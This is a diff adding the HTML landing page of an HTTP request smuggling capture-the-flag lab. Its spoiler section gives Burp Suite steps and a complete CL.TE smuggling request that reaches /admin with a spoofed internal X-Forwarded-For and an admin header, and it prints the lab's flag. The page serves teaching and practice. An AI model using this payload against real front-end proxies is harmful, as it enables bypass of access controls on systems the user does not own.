@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTTP Request Smuggling CTF</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #2c3e50;
+            border-bottom: 2px solid #3498db;
+            padding-bottom: 10px;
+        }
+        .hint {
+            background-color: #f8f9fa;
+            border-left: 4px solid #3498db;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        code {
+            background-color: #f8f9fa;
+            padding: 2px 5px;
+            border-radius: 3px;
+            font-family: monospace;
+        }
+        .scenario {
+            background-color: #e8f4f8;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .success {
+            background-color: #d4edda;
+            border-left: 4px solid #28a745;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .example {
+            background-color: #2c3e50;
+            color: #fff;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            overflow-x: auto;
+        }
+        .example code {
+            background-color: transparent;
+            color: #fff;
+        }
+        details {
+            margin: 20px 0;
+            padding: 15px;
+            background-color: #f8f9fa;
+            border-radius: 5px;
+            border: 1px solid #e9ecef;
+        }
+        summary {
+            cursor: pointer;
+            padding: 10px;
+            font-weight: bold;
+            color: #2c3e50;
+            user-select: none;
+        }
+        summary:hover {
+            color: #3498db;
+        }
+        details[open] summary {
+            margin-bottom: 15px;
+            border-bottom: 1px solid #e9ecef;
+        }
+        .spoiler-warning {
+            background-color: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+            color: #856404;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>HTTP Request Smuggling CTF Challenge</h1>
+        
+        <div class="scenario">
+            <h2>🎯 Objective:</h2>
+            <p>Exploit an HTTP Request Smuggling vulnerability to access the admin endpoint and retrieve the flag.</p>
+        </div>
+
+        <div class="success">
+            <h2>✅ Success Criteria:</h2>
+            <p>You will have successfully completed this lab when you see a response containing the flag:</p>
+            <code>{"flag":"CTF{http_smuggling_is_fun}","message":"Congratulations! You've accessed the admin endpoint."}</code>
+        </div>
+
+        <div class="hint">
+            <h3>🔍 Challenge Information:</h3>
+            <ul>
+                <li>The frontend proxy (Node.js) and backend server handle HTTP headers differently</li>
+                <li>The backend trusts the <code>X-Forwarded-For</code> header to determine if a request is internal</li>
+                <li>Try examining how the servers handle <code>Content-Length</code> vs <code>Transfer-Encoding</code></li>
+                <li>You might need to smuggle a request that appears to come from localhost...</li>
+            </ul>
+        </div>
+
+        <div class="spoiler-warning">
+            <strong>⚠️ Spoiler Alert!</strong> The following sections contain detailed instructions and tips. Try solving the challenge on your own first!
+        </div>
+
+        <details>
+            <summary>📝 How to Exploit (Click to expand)</summary>
+            <ol>
+                <li>Open Burp Suite and configure your browser to use it as a proxy</li>
+                <li>Navigate to <code>http://localhost</code> in your browser</li>
+                <li>In Burp Suite, go to the Proxy tab and find the request to <code>/</code></li>
+                <li>Right-click the request and select "Send to Repeater"</li>
+                <li>In the Repeater tab, modify the request to look like this:</li>
+            </ol>
+
+            <div class="example">
+                <code>
+POST / HTTP/1.1<br>
+Host: localhost<br>
+Content-Length: 6<br>
+Transfer-Encoding: chunked<br>
+Connection: close<br>
+<br>
+0<br>
+<br>
+GET /admin HTTP/1.1<br>
+Host: backend<br>
+X-Forwarded-For: 172.18.0.3<br>
+X-Admin-Access: true<br>
+<br>
+                </code>
+            </div>
+        </details>
+
+        <details>
+            <summary>💡 Tips (Click to expand)</summary>
+            <ul>
+                <li>Make sure to include the <code>Connection: close</code> header</li>
+                <li>The <code>Content-Length</code> should match the length of the chunked data (just the "0\r\n\r\n")</li>
+                <li>The smuggled request should include both <code>X-Forwarded-For</code> and <code>X-Admin-Access</code> headers</li>
+                <li>If you're not seeing the flag, try adjusting the <code>Content-Length</code> value</li>
+            </ul>
+        </details>
+
+        <h3>Endpoints:</h3>
+        <ul>
+            <li><code>/</code> - This landing page</li>
+            <li><code>/admin</code> - Protected admin endpoint (requires internal network access + proper header)</li>
+        </ul>
+
+        <p>Good luck! Remember: The key to smuggling is understanding how different servers interpret the same request differently.</p>
+    </div>
+</body>
+</html> 
